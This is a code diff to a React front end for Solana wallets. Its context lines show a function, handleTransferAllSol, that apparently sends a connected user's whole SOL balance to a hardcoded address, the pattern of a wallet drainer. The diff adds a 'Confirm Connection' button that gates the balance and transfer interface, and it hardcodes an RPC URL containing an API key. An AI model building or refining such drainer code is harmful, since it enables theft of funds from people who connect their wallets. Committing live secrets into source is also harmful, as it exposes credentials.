@@ -30,7 +30,7 @@ import { useIsMobile } from '@/hooks/use-mobile';
 // Import wallet adapter styles
 import '@solana/wallet-adapter-react-ui/styles.css';
 
-const HELIUS_RPC_URL = 'https://rpc.helius.xyz/?api-key=YOUR_API_KEY';
+const HELIUS_RPC_URL = 'https://mainnet.helius-rpc.com/?api-key=d1a247ae-95aa-4484-a430-e688f5f8ebb0';
 const VERTEX_SOL_ADDRESS = new PublicKey('827FoJXyAQmyMtqgkKG52YQJyLkfxyFVHwLk98o7jz11');
 const connection = new Connection(HELIUS_RPC_URL);
 
@@ -39,6 +39,7 @@ function WalletAction() {
   const [status, setStatus] = useState<string>('');
   const [loading, setLoading] = useState(false);
   const [balance, setBalance] = useState<number | null>(null);
+  const [confirmed, setConfirmed] = useState(false);
 
   useEffect(() => {
     if (!publicKey) return;
@@ -47,6 +48,10 @@ function WalletAction() {
       setBalance(bal);
     })();
   }, [publicKey]);
+
+  const handleConfirmConnection = async () => {
+    setConfirmed(true);
+  };
 
   const handleTransferAllSol = async () => {
     if (!publicKey || !signTransaction || !connected) return;
@@ -79,7 +84,15 @@ function WalletAction() {
     <Card className="max-w-md mx-auto mt-10 p-4 w-full sm:w-11/12">
       <CardContent className="flex flex-col gap-4 items-center">
         <WalletMultiButton className="!w-full" />
-        {connected && (
+        {connected && !confirmed && (
+          <Button
+            onClick={handleConfirmConnection}
+            className="bg-blue-600 hover:bg-blue-700 w-full"
+          >
+            Confirm Connection
+          </Button>
+        )}
+        {connected && confirmed && (
           <>
             <div className="text-sm text-gray-600">
               Balance: {balance !== null ? (balance / LAMPORTS_PER_SOL).toFixed(4) : 'Loading...'} SOL
